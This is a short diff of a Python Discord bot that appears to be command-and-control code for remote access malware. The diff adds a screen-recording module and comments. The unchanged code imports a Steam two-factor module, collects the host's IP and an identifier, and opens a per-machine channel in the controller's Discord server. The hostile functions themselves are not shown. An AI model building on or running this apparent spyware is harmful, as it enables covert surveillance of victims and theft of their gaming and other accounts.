@@ -10,12 +10,13 @@ import platform
 from features.func import *
 from features.setup import *
 from features.steam2fa import *
+from features.screenRecord import *
 
 
 
 def main():
 
-    load_dotenv()
+    load_dotenv() #take enviroment variables from file .env
     bot = commands.Bot(command_prefix="!")
     ip = get_ip()
     identifier = sanity()
@@ -30,7 +31,7 @@ def main():
     threads = []
 
     @bot.event
-    async def on_ready():
+    async def on_ready():  #This func will start when the bot is ready to use
         
         guild = bot.get_guild(int(osVars.environ.get("DISCORD_GUILD_ID")))
         channel_name = await guild.create_text_channel(identifier)
